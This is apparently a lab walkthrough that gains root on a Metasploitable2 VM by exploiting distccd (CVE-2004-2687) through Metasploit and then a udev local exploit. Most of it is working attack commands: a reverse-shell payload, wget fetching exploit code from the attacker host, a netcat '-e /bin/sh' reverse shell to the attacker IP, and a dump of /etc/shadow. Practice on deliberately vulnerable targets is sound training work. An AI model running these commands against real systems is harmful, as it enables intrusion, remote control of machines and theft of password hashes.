# Privilege Escalation on Metasploitable2 via DistCC & udev Exploit

## Terminal Tab 1: Reconnaissance & Initial Exploit

### Nmap Scan (Discover vulnerable services):
```bash
sudo nmap -sV -p 3632 --script vuln 172.16.6.128
```
Found distccd (v1) vulnerable to CVE-2004-2687 (command execution).

### Metasploit Exploitation (Gain initial shell as daemon):
```bash
msfconsole -q
use exploit/unix/misc/distcc_exec
set RHOSTS 172.16.6.128
set payload cmd/unix/reverse
run
```
**Result:** Shell as daemon user.

### Post-Exploration (Check user/processes):
```bash
whoami             # daemon
cat /etc/passwd    # List users
ps aux            # Check running processes
```

## Terminal Tab 2: Privilege Escalation Setup

### Host Exploit (Prepare udev exploit):
Used searchsploit to find udev exploits:
```bash
searchsploit udev
```
Chose `8572.c` (Linux Kernel 2.6 UDEV < 1.4.1 exploit).

### Transfer Exploit to Target:
Started Apache to host the exploit:
```bash
sudo systemctl start apache2
```
On victim (via Tab 1 shell):
```bash
wget http://192.168.92.12/test/8572.c -O /tmp/8572.c
cd /tmp
gcc 8572.c -o ud  # Compile exploit
```

### Prepare Netcat Listener (For root shell):
```bash
nc -lvp 2309
```

## Terminal Tab 3: Privilege Escalation Execution

### Trigger Exploit (From Tab 1 shell):
Create a malicious script (`/tmp/run`):
```bash
echo "#!/bin/sh" > /tmp/run
echo "/bin/netcat -e /bin/sh 192.168.92.12 2309" >> /tmp/run
chmod +x /tmp/run
```

### Find udevd PID:
```bash
cat /proc/net/netlink  # Note PID (e.g., 2750)
```

### Execute exploit:
```bash
./ud 2750
```

### Root Shell Obtained (In Tab 3):
Netcat listener catches root shell:
```bash
whoami    # root
cat /etc/shadow  # Dump password hashes
```

